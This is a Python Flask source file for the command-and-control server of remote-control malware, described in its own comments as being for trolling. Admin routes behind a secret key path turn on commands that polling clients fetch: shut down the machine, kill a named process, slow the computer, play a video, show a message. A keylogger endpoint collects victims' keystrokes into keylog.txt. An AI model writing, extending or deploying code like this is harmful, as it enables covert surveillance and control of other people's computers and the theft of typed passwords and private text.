import socket
from flask import Flask, request, Response, jsonify
from time import sleep
from os import system
import threading
import logging
import random
import string
import asyncio
from json import load, dump
app = Flask(__name__)
logging.basicConfig(level=logging.DEBUG)


class server():
    def __init__(self):
        # These variables control the client.
        self.shutdown = False 
        self.play = None # Play different videos for trolling.
        self.response_count = 0
        self.disconnect = False # Destroys the object by disconnecting the client from the server.
        self.authkey_ = open('authkey.json', 'r+')
        self.authkey = load(self.authkey_)['auth_key']
        self.response_count_recovery = 0
        self.keylogger = False
        self.ShowMessage = False
        self.message = None
        self.ShouldTerminate = False
        self.terminate = None
        self.slowcomputer = False
        self.application_name = None

    def main(self):
        @app.route('/')
        def response0():
            self.response_count = self.response_count + 1
            self.response_count_recovery = self.response_count_recovery + 1
            return Response(status=200)

        @app.route('/shutdown')
        def response():
            if self.shutdown == True:
                while self.response_count > 0:
                    return Response(status=200)
                    self.response_count = self.response_count - 1
                if self.response_count == 0:
                    self.response_count = self.response_count_recovery
                    self.shutdown = False
                else:
                    pass

            else:
                return Response(status=202)

        @app.route('/play')
        def response1():
            if self.play != None:
                while self.response_count > 0:
                    self.response_count = self.response_count - 1
                    return jsonify (
                        url=str(self.play),
                        status=200
                    )
                if self.response_count == 0:
                    self.response_count = self.response_count_recovery
                    self.play = ""

            else:
                return Response(status=202)


        @app.route('/disconnect', methods=['GET'])
        def response3():
            if self.disconnect == True:
                while self.response_count > 0:
                    return Response(status=200)
                    self.response_count = self.response_count - 1

                if self.response_count == 0:
                    self.response_count = self.response_count_recovery
                    self.disconnect = False

            else:
                return Response(status=202)

        @app.route('/keylogger', methods=['POST', 'GET'])
        def response4():
            if self.keylogger == True:
                try:
                    open('keylog.txt', 'a').write(request.json['data'])
                    return Response(status=200)

                except:
                    return Response(status=200)
        

            else:
                return Response(status=202)


        @app.route('/message', methods=['GET'])
        def response5():
            if self.ShowMessage == True:
                if self.message == None:
                    return Response(status=201)
                else:
                    msg_data = {'msg' : str(self.message)}
                    return jsonify(msg_data)
                

            else:
                return Response(status=201)


        @app.route('/terminate')
        def response6():
            if self.ShouldTerminate == True:
                process = {"process" : str(self.terminate)}
                return jsonify(process)
                self.ShouldTerminate = False

            else:
                return Response(status=201)

        

        @app.route('/slowcomp')
        def response7():
            if self.slowcomputer == True:
                app_name = {'name' : str(self.application_name)}
                return jsonify(app_name)

            else:
                return Response(status=201)


        # Admin management

        @app.route(f'/{self.authkey}/message', methods=['POST'])
        def adminresponse0():
            msg_data = request.json
            try:
                self.message = msg_data['msg']
                self.ShowMessage = True
                return Response(status=200)

            except:
                return Response(status=400)



        @app.route(f'/{self.authkey}/keylogger', methods=['GET'])
        def adminresponse1():
            if self.keylogger == True:
                self.keylogger = False
                return Response(status=201)

            else:
                self.keylogger = True
                return Response(status=200)

        @app.route(f'/{self.authkey}/disconnect', methods=['GET'])
        def adminresponse():
            self.disconnect = True
            return Response(status=200)

        @app.route(f'/{self.authkey}/play', methods=['POST'])
        def adminresponse2():
            url_ = request.json
            self.play = url_['url']
            return Response(status=200)

        @app.route(f'/{self.authkey}/shutdown', methods=['GET'])
        def adminresponse3():
            self.shutdown = True
            return Response(status=200)

        @app.route(f'/{self.authkey}/terminate', methods=["POST"])
        def adminresponse4():
            process_name = request.json
            self.ShouldTerminate = True
            self.terminate = process_name['process']
            return Response(status=200)


        @app.route(f'/{self.authkey}/slowcomp', methods=["POST"])
        def adminresponse5():
            if self.slowcomputer == False:
                self.application_name = request.json['name']
                self.slowcomputer = True
                return Response(status=200)

            else:
                self.slowcomputer = False
                return Response(status=200)
        


        app.run('localhost', debug=True)


if __name__ == '__main__':
    json_file = open('authkey.json', 'r')
    json_stuff = load(json_file)
    if json_stuff['auth_key'] == "":
        json_stuff['auth_key'] = ''.join(random.choice(string.ascii_letters) for x in range(12))
        dump(json_stuff, open('authkey.json', 'w'))


    threading.Thread(target=server().main()).run()
    

